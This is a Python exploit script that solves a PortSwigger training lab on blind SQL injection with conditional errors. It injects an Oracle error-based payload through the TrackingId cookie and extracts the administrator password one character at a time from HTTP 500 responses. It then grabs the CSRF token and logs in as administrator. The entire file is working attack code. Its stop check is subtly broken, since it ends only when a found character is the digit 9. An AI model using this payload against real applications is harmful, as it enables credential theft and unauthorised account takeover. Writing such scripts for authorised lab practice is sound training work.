import requests
import argparse
import re

# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Specify a target. \nE.g. -t https://abcdefghijk1234567.web-security-academy.net")
args = parser.parse_args()

if not args.target:
    print("[!] You need to specify a target.")
    print("[*] Example usage: sqli-10.py -t https://abcdefghijk1234567.web-security-academy.net")
    exit(0)

# test the connection to the target
r = requests.get(args.target)
if r.status_code == 200:
    print('[*] Target is up')
else:
    print('[!] Target seems down')
    exit(0)

# get the tracking id
r = requests.get(args.target)

if r.status_code == 200:
    headers = r.headers
    trackingID_search = re.search('TrackingId=(.+?);', r.headers['Set-Cookie'])
    session_search = re.search('session=(.+?);', r.headers['Set-Cookie'])
    if trackingID_search:
        print("[*] TrackingID found: " + trackingID_search.group(1))
        print("[*] Session found: " + session_search.group(1))
        trackingID = trackingID_search.group(1)
        sessionID = session_search.group(1)
    else:
        print("[!] TrackingID not found")
        exit(0)
else:
    print("[!] There was an error with the request")
    exit(0)

# create list of potential characaters
lower_character_list = [chr(x) for x in range(ord('a'), ord('z') + 1)]
upper_character_list = [chr(x) for x in range(ord('A'), ord('Z') + 1)]
numbers_list = list(range(0, 10))
char_list = lower_character_list + upper_character_list + numbers_list
print("[*] Character list created: " + str(char_list))

# begin extracting the password
password = ""
found = False
while not found:
    print(f"[*] Password so far: {password}")
    for char in char_list:
        payload = trackingID + "'||(SELECT CASE WHEN SUBSTR(password," + str((len(password) + 1)) + ",1)='" + str(char) + "' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        cookies = {'TrackingId': payload, 'session': sessionID}
        print(f"[*] Trying: {char}")
        r = requests.get(args.target, cookies=cookies)
        if r.status_code == 500:
            password += str(char)
            print(f"[*] Character found: {char}")
            break
        if char == 9:
            print(f"[*] Done, the administrator password is: {password}")
            found = True

# get the CSRF token from the admin page
login_url = args.target + "/login"
cookies = {'TrackingId': trackingID, 'session': sessionID}
r = requests.get(login_url, cookies=cookies)
csrf_token_search = re.search('csrf" value="(.+?)"', str(r.content))
csrf_token = csrf_token_search.group(1)
print(f"[*] Got the CSRF token: {csrf_token}")

# login
login_data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}

print("[*] Trying to login as administrator")
success_text = b"Congratulations"
r = requests.post(login_url, data=login_data, cookies=cookies)
if r.status_code == 200:
    if success_text in r.content:
        print("[*] Success!")
    else:
        print("[!] Failed to login")
else:
    print("[!] Login request failed.")

